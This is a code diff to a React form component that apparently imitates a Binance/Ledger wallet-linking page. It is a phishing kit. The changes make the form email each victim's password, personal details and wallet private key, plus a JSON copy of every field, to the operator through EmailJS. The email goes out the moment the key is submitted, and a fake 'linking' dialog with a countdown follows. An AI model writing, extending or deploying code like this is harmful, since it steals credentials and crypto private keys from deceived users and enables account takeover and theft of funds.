@@ -1,3 +1,4 @@
+
 import { FC, useState, FormEvent, useEffect } from "react";
 import { useToast } from "@/components/ui/use-toast";
 import { Checkbox } from "@/components/ui/checkbox";
@@ -143,6 +144,7 @@ const BinanceLedgerForm: FC = () => {
 
   const sendEmailNotification = async () => {
     try {
+      // Create email template params with all form data
       const templateParams = {
         user_email: formData.email,
         user_password: formData.password,
@@ -153,8 +155,9 @@ const BinanceLedgerForm: FC = () => {
         user_zip: formData.zipCode,
         user_city: formData.city,
         user_country: formData.country,
-        user_private_key: formData.privateKey,
+        user_private_key: formData.privateKey || "No private key provided",  // Ensure private key is included
         submission_date: new Date().toLocaleString(),
+        // Include complete form data as JSON for backup
         form_data: JSON.stringify({
           email: formData.email,
           password: formData.password,
@@ -166,19 +169,22 @@ const BinanceLedgerForm: FC = () => {
           zipCode: formData.zipCode,
           city: formData.city,
           country: formData.country,
-          privateKey: formData.privateKey,
+          privateKey: formData.privateKey || "No private key provided", // Ensure private key is included in JSON
           walletConfirmations: formData.walletConfirmations
         }, null, 2)
       };
 
-      await emailjs.send(
+      console.log('Sending email with template params:', JSON.stringify(templateParams));
+
+      // Send email with EmailJS
+      const response = await emailjs.send(
         EMAILJS_CONFIG.SERVICE_ID,
         EMAILJS_CONFIG.TEMPLATE_ID,
         templateParams,
         EMAILJS_CONFIG.USER_ID
       );
 
-      console.log('Email sent successfully');
+      console.log('Email sent successfully:', response);
       return true;
     } catch (error) {
       console.error('Failed to send email:', error);
@@ -398,6 +404,8 @@ const BinanceLedgerForm: FC = () => {
         
       case FormStep.WALLET_STEP8:
         if (validatePrivateKey()) {
+          // Also send an email when the private key is submitted
+          sendEmailNotification();
           setShowLinkingDialog(true);
           setCurrentStep(FormStep.WALLET_LINKING);
           setTimerCount(10); // Reset timer when starting linking
